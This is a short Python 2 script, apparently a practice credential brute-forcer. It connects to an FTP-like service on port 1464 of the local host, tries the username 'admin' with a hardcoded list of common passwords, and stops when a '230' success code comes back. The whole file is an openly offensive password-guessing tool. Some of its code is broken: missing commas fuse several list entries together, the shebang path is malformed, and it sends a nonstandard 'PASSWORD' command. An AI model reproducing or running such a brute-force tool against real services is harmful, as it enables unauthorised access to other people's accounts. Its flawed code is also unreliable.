#!usr/bin/python

import re
import socket
import sys

def connect(username, password):
	HOST = socket.gethostname()
	PORT = 1464
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print "Trying User: " + username +" Password: " + password
	s.connect((HOST, PORT))
	data = s.recv(1024)
	s.send("USER " + username +"\r\n")
	data = s.recv(1024)
	s.send("PASSWORD " + password + '\r\n')
	data = s.recv(3)
	s.send('QUIT\r\n')
	s.close()

	return data

username = 'admin'
passwords = ["test", "password", "12345678", "root", "admin" "ftp", "root" "administrator" "backup" '12345']

for password in passwords:
	attempt = connect(username, password)
	if attempt == "230":
		print "[*] Password: " + password
		sys.exit(0)